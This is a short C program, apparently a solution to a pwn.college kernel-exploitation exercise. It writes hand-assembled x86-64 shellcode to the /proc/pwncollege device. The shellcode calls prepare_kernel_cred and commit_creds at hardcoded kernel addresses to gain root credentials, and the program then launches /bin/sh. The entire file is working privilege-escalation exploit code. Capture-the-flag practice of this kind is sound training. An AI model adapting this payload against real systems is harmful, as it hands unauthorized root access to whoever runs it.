#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

// Raw shellcode bytes
unsigned char shellcode[] = {
    // movabs rax, 0xffffffff81089660 (prepare_kernel_cred)
    0x48, 0xb8, 0x60, 0x96, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    // xor rdi, rdi  
    0x48, 0x31, 0xff,
    // call rax
    0xff, 0xd0,
    // mov rdi, rax
    0x48, 0x89, 0xc7,
    // movabs rax, 0xffffffff81089310 (commit_creds)
    0x48, 0xb8, 0x10, 0x93, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    // call rax  
    0xff, 0xd0,
    // ret
    0xc3
};

int main() {
	int fd;

	fd = open("/proc/pwncollege", O_WRONLY);

	write(fd, shellcode, sizeof(shellcode));

	system("/bin/sh");

	close(fd);    

	return 0;
}
